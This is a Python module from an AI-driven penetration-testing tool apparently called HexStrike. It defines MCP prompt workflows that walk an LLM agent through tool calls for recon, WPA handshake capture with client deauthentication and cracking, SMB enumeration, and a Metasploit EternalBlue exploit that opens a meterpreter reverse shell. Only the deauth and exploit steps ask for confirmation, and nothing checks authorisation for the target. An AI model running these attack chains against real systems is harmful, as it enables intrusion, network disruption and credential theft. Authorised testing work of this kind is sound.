"""
mcp_core/prompts.py

FastMCP 3.x native workflow prompts for HexStrike AI.

Each @mcp.prompt() returns list[Message] — structured user/assistant messages
that guide the LLM through a multi-step workflow. User messages set context
and ask for action; assistant messages show the exact run_security_tool() calls.

Registered in setup_mcp_server_standalone() via register_prompts().

CTF prompts powered by CTFWorkflowManager (V6 intelligence layer):
  ctf_web_challenge  — web-specific, URL-based entry point
  ctf_challenge      — universal, all 7 categories (web/crypto/pwn/forensics/rev/misc/osint)

Skills reference:
  nmap-recon, subdomain-enum, web-recon, web-vuln,
  password-cracking, smb-enum, exploitation, cloud-audit
"""

from fastmcp import FastMCP
from fastmcp.prompts.prompt import Message


def register_prompts(mcp: FastMCP) -> None:
    """Register all HexStrike workflow prompts."""

    @mcp.prompt()
    async def bug_bounty_recon(target: str) -> list[Message]:
        """
        Full bug bounty reconnaissance workflow.
        Skills: subdomain-enum + nmap-recon + web-recon + web-vuln

        Ordering rationale:
          1. WAF detection FIRST — prevents gobuster/nuclei from being blocked
          2. Subdomain enum — passive, no noise
          3. Port scan — after knowing live hosts
          4. Directory discovery — after WAF is known
          5. Vuln scan — last, noisiest

        Args:
            target: Root domain to recon (e.g. 'example.com')
        """
        return [
            Message(
                f"You are running a full bug bounty reconnaissance workflow on target: {target}. "
                "Execute each step in order using run_security_tool()."
            ),
            Message(
                f"STEP 1 — WAF detection and tech stack fingerprint (run first to avoid blocks):\n"
                f'run_security_tool(tool_name="wafw00f", parameters=\'{{"url": "https://{target}"}}\')\n'
                f'run_security_tool(tool_name="httpx", parameters=\'{{"target": "{target}", "probe": true, "tech_detect": true, "title": true, "status_code": true}}\')',
                role="assistant",
            ),
            Message(
                f"STEP 2 — Subdomain enumeration (passive, no noise):\n"
                f'run_security_tool(tool_name="subfinder", parameters=\'{{"domain": "{target}", "silent": true}}\')\n'
                f'run_security_tool(tool_name="amass", parameters=\'{{"domain": "{target}", "mode": "enum"}}\')',
                role="assistant",
            ),
            Message(
                f"STEP 3 — Port discovery and service detection:\n"
                f'run_security_tool(tool_name="rustscan", parameters=\'{{"target": "{target}", "ports": "1-65535"}}\')\n'
                f'run_security_tool(tool_name="nmap", parameters=\'{{"target": "{target}", "additional_args": "-sV -sC -T4"}}\')',
                role="assistant",
            ),
            Message(
                f"STEP 4 — Web content discovery (post-WAF fingerprint):\n"
                f'run_security_tool(tool_name="katana", parameters=\'{{"url": "https://{target}"}}\')\n'
                f'run_security_tool(tool_name="gobuster", parameters=\'{{"url": "https://{target}", "mode": "dir", "wordlist": "/usr/share/wordlists/dirb/common.txt", "additional_args": "-x php,html,txt"}}\')',
                role="assistant",
            ),
            Message(
                f"STEP 5 — Vulnerability scan (last — noisiest step):\n"
                f'run_security_tool(tool_name="nuclei", parameters=\'{{"target": "https://{target}", "severity": "critical,high"}}\')\n'
                f'run_security_tool(tool_name="nikto", parameters=\'{{"target": "https://{target}"}}\')',
                role="assistant",
            ),
            Message(
                f"FINAL — Compile findings for {target}: subdomains discovered, open ports, "
                "tech stack, vulnerabilities. Prioritise critical/high severity and identify attack surface."
            ),
        ]

    @mcp.prompt()
    async def wifi_attack_chain(interface: str, bssid: str, channel: str = "6") -> list[Message]:
        """
        Full WiFi WPA/WPA2 handshake capture and crack chain.
        Skills: wifi_pentest

        Args:
            interface: Wireless interface (e.g. 'wlan0')
            bssid:     Target AP MAC address (e.g. 'AA:BB:CC:DD:EE:FF')
            channel:   Target AP channel (default '6')
        """
        return [
            Message(
                f"You are running a WiFi WPA/WPA2 attack chain — "
                f"interface: {interface} | BSSID: {bssid} | channel: {channel}. "
                "Execute each step in order."
            ),
            Message(
                f"STEP 1 — Enable monitor mode:\n"
                f'run_security_tool(tool_name="airmon_ng", parameters=\'{{"interface": "{interface}", "action": "start"}}\')',
                role="assistant",
            ),
            Message(
                f"STEP 2 — Start targeted capture:\n"
                f'run_security_tool(tool_name="airodump_ng", parameters=\'{{"interface": "{interface}mon", "bssid": "{bssid}", "channel": "{channel}", "output_prefix": "/tmp/hexstrike_capture"}}\')',
                role="assistant",
            ),
            Message(
                "⚠️ STEP 3 requires user confirmation — deauth attack will disconnect all clients. "
                "Confirm before proceeding."
            ),
            Message(
                f"STEP 3 — Force client deauthentication to capture handshake:\n"
                f'run_security_tool(tool_name="aireplay_ng", parameters=\'{{"interface": "{interface}mon", "attack_mode": 0, "bssid": "{bssid}", "count": 10}}\')',
                role="assistant",
            ),
            Message(
                f"STEP 4 — Crack captured handshake:\n"
                f'run_security_tool(tool_name="aircrack_ng", parameters=\'{{"capture_files": ["/tmp/hexstrike_capture-01.cap"], "wordlist": "/usr/share/wordlists/rockyou.txt", "bssid": "{bssid}"}}\')',
                role="assistant",
            ),
            Message(
                f"STEP 5 — Restore managed mode:\n"
                f'run_security_tool(tool_name="airmon_ng", parameters=\'{{"interface": "{interface}mon", "action": "stop"}}\')',
                role="assistant",
            ),
            Message(
                f"FINAL — Report: handshake capture status, cracking result for BSSID {bssid}. "
                "If KEY NOT FOUND, suggest hashcat GPU cracking with rules."
            ),
        ]

    @mcp.prompt()
    async def ctf_web_challenge(url: str) -> list[Message]:
        """
        CTF web challenge — enumeration and exploitation workflow.
        Powered by CTFWorkflowManager (V6 intelligence layer).
        Skills: web-recon + web-vuln

        Args:
            url: Challenge URL (e.g. 'http://challenge.ctf.local:8080')
        """
        from server_core.singletons import get_ctf_manager
        from server_core.workflows.ctf.CTFChallenge import CTFChallenge

        challenge = CTFChallenge(
            name="ctf_web",
            category="web",
            description=f"CTF web challenge at {url}",
            difficulty="unknown",
            url=url,
            target=url,
        )

        ctf = get_ctf_manager()
        workflow = ctf.create_ctf_challenge_workflow(challenge)

        steps = workflow.get("workflow_steps", [])
        strategies = workflow.get("strategies", [])
        fallback = workflow.get("fallback_strategies", [])
        suggested_tools = workflow.get("tools", [])
        est_time_min = workflow.get("estimated_time", 3600) // 60
        success_prob = workflow.get("success_probability", 0.65)
        validation = workflow.get("validation_steps", [])

        strategy_summary = ""
        if strategies:
            strategy_summary = "\nStrategies: " + ", ".join(s["strategy"] for s in strategies[:4])

        fallback_summary = ""
        if fallback:
            fallback_summary = "\nFallback: " + ", ".join(f["strategy"] for f in fallback[:3])

        def step_label(n):
            if len(steps) > n:
                return f"{steps[n]['action']} — {steps[n]['description']}"
            return ""

        return [
            Message(
                f"CTF Web Challenge at: {url}\n"
                f"Estimated: ~{est_time_min} min | Success probability: {success_prob:.0%}\n"
                f"CTFWorkflowManager tools: {', '.join(suggested_tools[:8])}"
                f"{strategy_summary}"
                f"{fallback_summary}\n"
                "Execute each step using run_security_tool()."
            ),
            Message(
                f"STEP 1 — {step_label(0) or 'Reconnaissance: tech detection and WAF check'}\n"
                f'run_security_tool(tool_name="wafw00f", parameters=\'{{"url": "{url}"}}\')\n'
                f'run_security_tool(tool_name="httpx", parameters=\'{{"target": "{url}", "probe": true, "tech_detect": true, "title": true}}\')\n'
                f'run_security_tool(tool_name="nikto", parameters=\'{{"target": "{url}"}}\')',
                role="assistant",
            ),
            Message(
                f"STEP 2 — {step_label(2) or 'Directory enumeration: multi-tool discovery'}\n"
                f'run_security_tool(tool_name="gobuster", parameters=\'{{"url": "{url}", "mode": "dir", "wordlist": "/usr/share/wordlists/dirb/common.txt", "additional_args": "-x php,html,txt,bak,old,zip"}}\')\n'
                f'run_security_tool(tool_name="ffuf", parameters=\'{{"url": "{url}/FUZZ", "wordlist": "/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt", "match_codes": "200,204,301,302,307,401,403"}}\')\n'
                f'run_security_tool(tool_name="katana", parameters=\'{{"url": "{url}"}}\')',
                role="assistant",
            ),
            Message(
                f"STEP 3 — {step_label(4) or 'Vulnerability scanning: automated scan + injection testing'}\n"
                f'run_security_tool(tool_name="nuclei", parameters=\'{{"target": "{url}"}}\')\n'
                f'run_security_tool(tool_name="sqlmap", parameters=\'{{"url": "{url}", "additional_args": "--batch --level=3 --risk=2 --dbs"}}\')\n'
                f'run_security_tool(tool_name="dalfox", parameters=\'{{"url": "{url}"}}\')',
                role="assistant",
            ),
            Message(
                f"STEP 4 — {step_label(5) or 'Manual exploitation'}\n"
                "If automation found nothing: apply fallback strategies above.\n"
                "Parameter tampering, cookie/session manipulation, business logic flaws."
            ),
            Message(
                f"FINAL — Collect CTF findings for {url}:\n"
                "- Flags: check /flag, /flag.txt, /etc/passwd, response bodies, cookies, source comments\n"
                "- Validation: " + ", ".join(v["step"] for v in validation[:4])
            ),
        ]

    @mcp.prompt()
    async def ctf_challenge(
        name: str,
        category: str,
        description: str,
        difficulty: str = "unknown",
        target: str = "",
        points: int = 0,
    ) -> list[Message]:
        """
        Universal CTF challenge workflow — all categories.
        Powered by CTFWorkflowManager + CTFToolManager (V6 intelligence layer).

        The workflow is generated dynamically from the challenge description and category.
        Tool selection, strategy, time estimation, and resource requirements are all
        computed by CTFWorkflowManager based on the V6 intelligence layer.

        Categories: web, crypto, pwn, forensics, rev, misc, osint

        Args:
            name:        Challenge name
            category:    Challenge category (web/crypto/pwn/forensics/rev/misc/osint)
            description: Challenge description — drives intelligent tool selection
            difficulty:  easy/medium/hard/insane/unknown (default 'unknown')
            target:      Target URL, IP, or binary path (optional)
            points:      Challenge point value (optional)
        """
        from server_core.singletons import get_ctf_manager
        from server_core.workflows.ctf.CTFChallenge import CTFChallenge
        from server_core.workflows.ctf.toolManager import CTFToolManager

        challenge = CTFChallenge(
            name=name,
            category=category,
            description=description,
            difficulty=difficulty,
            target=target,
            points=points,
        )

        ctf = get_ctf_manager()
        tool_mgr = CTFToolManager()
        workflow = ctf.create_ctf_challenge_workflow(challenge)

        steps = workflow.get("workflow_steps", [])
        strategies = workflow.get("strategies", [])
        fallback = workflow.get("fallback_strategies", [])
        parallel_tasks = workflow.get("parallel_tasks", [])
        suggested_tools = workflow.get("tools", [])
        est_time_min = workflow.get("estimated_time", 3600) // 60
        success_prob = workflow.get("success_probability", 0.55)
        validation = workflow.get("validation_steps", [])
        expected_artifacts = workflow.get("expected_artifacts", [])
        resources = workflow.get("resource_requirements", {})

        # Build tool commands for the top suggested tools
        tool_commands = []
        for tool in suggested_tools[:4]:
            try:
                cmd = tool_mgr.get_tool_command(tool, target or name)
                tool_commands.append(f"  {tool}: {cmd[:100]}")
            except Exception:
                tool_commands.append(f"  {tool}: (see tool docs)")

        # Parallel execution summary
        parallel_info = ""
        if parallel_tasks:
            groups = [
                f"[{g['task_group']}] {', '.join(g['tasks'][:3])} (max {g['max_concurrent']} concurrent)"
                for g in parallel_tasks[:3]
            ]
            parallel_info = "\n\nParallel execution:\n" + "\n".join(groups)

        # Resource summary
        resource_info = ""
        if resources:
            resource_info = (
                f"\nRequired: {resources.get('cpu_cores', 2)} CPU cores, "
                f"{resources.get('memory_mb', 2048)}MB RAM"
                + (", GPU" if resources.get("gpu_required") else "")
            )

        messages = [
            Message(
                f"CTF Challenge: [{category.upper()}] {name} | {difficulty} | {points} pts\n"
                f"Description: {description[:200]}{'...' if len(description) > 200 else ''}\n"
                f"Target: {target or 'see challenge files'}\n"
                f"Estimated: ~{est_time_min} min | Success probability: {success_prob:.0%}"
                f"{resource_info}\n\n"
                f"CTFWorkflowManager selected {len(suggested_tools)} tools: {', '.join(suggested_tools[:8])}\n"
                + ("\nOptimized commands:\n" + "\n".join(tool_commands) if tool_commands else "")
                + parallel_info
            ),
        ]

        # Add workflow steps as assistant messages
        for step in steps[:6]:
            step_tools = step.get("tools", [])
            is_parallel = step.get("parallel", False)
            est_step_min = step.get("estimated_time", 600) // 60

            step_calls = []
            for tool in step_tools[:3]:
                if tool not in ("manual", "custom", "python", "sage"):
                    step_calls.append(
                        f'run_security_tool(tool_name="{tool}", '
                        f'parameters=\'{{"target": "{target or name}"}}\')'
                    )
                else:
                    step_calls.append(f"# {step['description']}")

            parallel_note = " [PARALLEL — run concurrently]" if is_parallel else ""
            step_content = (
                f"STEP {step['step']} — {step['action'].upper()}{parallel_note} (~{est_step_min} min):\n"
                f"{step['description']}\n"
                + ("\n".join(step_calls) if step_calls else f"# {step['description']}")
            )
            messages.append(Message(step_content, role="assistant"))

        # Strategies + fallback
        if strategies:
            strategy_content = (
                f"KEY STRATEGIES for {category} challenges:\n"
                + "\n".join(
                    f"  • {s['strategy']}: {s['description']}"
                    for s in strategies[:5]
                )
            )
            if fallback:
                strategy_content += (
                    "\n\nFALLBACK if primary fails:\n"
                    + "\n".join(
                        f"  • {f['strategy']}: {f['description']}"
                        for f in fallback[:3]
                    )
                )
            messages.append(Message(strategy_content))

        # Final validation
        artifact_list = (
            ", ".join(a["type"] for a in expected_artifacts[:4])
            if expected_artifacts else "flag, solution artifacts"
        )
        validation_list = (
            ", ".join(v["step"] for v in validation[:4])
            if validation else "flag_format_check, solution_verification"
        )

        messages.append(Message(
            f"FINAL — Collect results for [{category.upper()}] {name}:\n"
            f"Expected artifacts: {artifact_list}\n"
            f"Validation: {validation_list}\n"
            "Flag format: flag{...} or CTF{...} — validate before submitting."
        ))

        return messages

    @mcp.prompt()
    async def smb_lateral_movement(target: str) -> list[Message]:
        """
        SMB enumeration and lateral movement workflow.
        Skills: smb-enum + exploitation

        Args:
            target: Target IP or CIDR range (e.g. '10.10.10.10' or '192.168.1.0/24')
        """
        return [
            Message(
                f"You are running an SMB enumeration and lateral movement workflow on target: {target}. "
                "Execute each step in order."
            ),
            Message(
                f"STEP 1 — NetBIOS discovery and SMB version check:\n"
                f'run_security_tool(tool_name="nbtscan", parameters=\'{{"target": "{target}"}}\')\n'
                f'run_security_tool(tool_name="nmap", parameters=\'{{"target": "{target}", "ports": "445,139", "additional_args": "-sV -sC --script smb-vuln-*,smb-security-mode,smb2-security-mode"}}\')',
                role="assistant",
            ),
            Message(
                f"STEP 2 — Null session enumeration:\n"
                f'run_security_tool(tool_name="enum4linux", parameters=\'{{"target": "{target}", "additional_args": "-a"}}\')\n'
                f'run_security_tool(tool_name="smbmap", parameters=\'{{"target": "{target}"}}\')',
                role="assistant",
            ),
            Message(
                f"STEP 3 — Check EternalBlue + credential testing:\n"
                f'run_security_tool(tool_name="nmap", parameters=\'{{"target": "{target}", "ports": "445", "additional_args": "--script smb-vuln-ms17-010"}}\')\n'
                f'run_security_tool(tool_name="netexec", parameters=\'{{"target": "{target}", "protocol": "smb"}}\')',
                role="assistant",
            ),
            Message(
                "⚠️ STEP 4 requires user confirmation — EternalBlue exploit will run only if MS17-010 is confirmed. Confirm before proceeding."
            ),
            Message(
                f"STEP 4 — Exploit EternalBlue if confirmed:\n"
                f'run_security_tool(tool_name="metasploit", parameters=\'{{"module": "exploit/windows/smb/ms17_010_eternalblue", "options": {{"RHOSTS": "{target}", "PAYLOAD": "windows/x64/meterpreter/reverse_tcp"}}}}\')',
                role="assistant",
            ),
            Message(
                f"FINAL — Report SMB findings for {target}: shares accessible, users enumerated, "
                "vulnerabilities confirmed, lateral movement paths identified."
            ),
        ]

    @mcp.prompt()
    async def cloud_security_audit(
        provider: str = "aws",
        profile: str = "default",
        target_image: str = "",
        k8s_api_ip: str = "",
    ) -> list[Message]:
        """
        Cloud security audit workflow.
        Skills: cloud-audit

        Args:
            provider:     Cloud provider ('aws', 'azure', 'gcp')
            profile:      Cloud credential profile (default 'default')
            target_image: Container image to scan (e.g. 'myapp:latest', default 'nginx:latest')
            k8s_api_ip:   Kubernetes API IP for cluster assessment (optional)
        """
        image = target_image or "nginx:latest"
        return [
            Message(
                f"You are running a cloud security audit — provider: {provider} | profile: {profile}. "
                "Execute each step in order."
            ),
            Message(
                f"STEP 1 — Cloud configuration and compliance audit:\n"
                f'run_security_tool(tool_name="prowler", parameters=\'{{"provider": "{provider}", "profile": "{profile}"}}\')',
                role="assistant",
            ),
            Message(
                f"STEP 2 — Container image vulnerability scan (target: {image}):\n"
                f'run_security_tool(tool_name="trivy", parameters=\'{{"target": "{image}", "scan_type": "image", "severity": "HIGH,CRITICAL"}}\')',
                role="assistant",
            ),
            Message(
                f"STEP 3 — Kubernetes cluster assessment"
                + (f" (API: {k8s_api_ip}):\n"
                   f'run_security_tool(tool_name="kube_hunter", parameters=\'{{"additional_args": "--remote {k8s_api_ip}"}}\')'
                   if k8s_api_ip else
                   ":\nSkip if no Kubernetes cluster — provide k8s_api_ip parameter to enable."),
                role="assistant",
            ),
            Message(
                f"FINAL — Cloud audit report for {provider}: IAM misconfigurations, public resources, "
                f"container CVEs ({image}), Kubernetes attack surface. Prioritise CRITICAL findings."
            ),
        ]
